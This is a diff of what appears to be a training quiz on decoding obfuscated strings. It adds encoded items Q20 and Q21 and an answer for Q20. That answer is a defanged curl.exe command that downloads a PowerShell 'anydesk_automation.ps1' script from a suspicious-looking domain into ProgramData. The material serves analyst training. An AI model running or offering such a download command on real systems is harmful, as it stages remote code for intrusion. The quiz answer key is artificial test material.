@@ -116,11 +116,13 @@ Adjust the answer, as the 'tt' in 'https' resolved to 'xx'.<br><br>
 **Answer: https://azurecresthospital.med/news/research/run-your-own-erp-systems-on-sqlite-what-could-possibly-go-wrong**<br<br>
 
 
-**Q20. **<br><br>
+**Q20. H4sIAHySBGYA/23MscoCMRAE4FfJCxixtdXC0j4uP2tuMT9essfuBMzbnxxX2gzMDHy52xzlI+Gg4XJOKT2I6G76Mq5XBu/LTdjw7Nb2zm1M4u8/7tDK+NcWFz+FAiz+VY5EW/RWhGeUYZLVJh8OqR4huWz/b2YFYGJUDpQAAAA=**<br><br>
 
-**Answer: **<br><br>
+From Base64.<br><br>
 
-**Q21. **<br><br>
+**Answer: curl.exe -o C:[[[\]]]ProgramData[[[\]]]Heartburn[[[\]]]anydesk_automation.ps1 https:[[/]][[/]]unhealthyrecordsystems.tech[[/]]anydesk_automation.ps1**<br><br>
+
+**Q21. bmVxYXJjYnlidXBmLm9xLmZydmViZ2FyaWF2X3lucHZxcnpyYnpycnJhdnZ2enJycnZ2YXJycnpycnJ2dmFycnJycnJienJycmF2dnZ6cnJydnZhcnJyenJycnZ2YXJycnJycmZub25nblFyYnpycnJhdnZ2enJycnZ2YXJycnpycnJ2dmFycnJycnJienJycmF2dnZ6cnJydnZhcnJyenJycnZ2YXJycnJyenJnZmxGcmJ6cnJyYXZ2dnpycnJ2dmFycnJ6cnJydnZhcnJycnJyYnpycnJhdnZ2enJycnZ2YXJycnpycnJ2dmFycnJycjpQ**<br><br>
 
 **Answer: **<br><br>
 
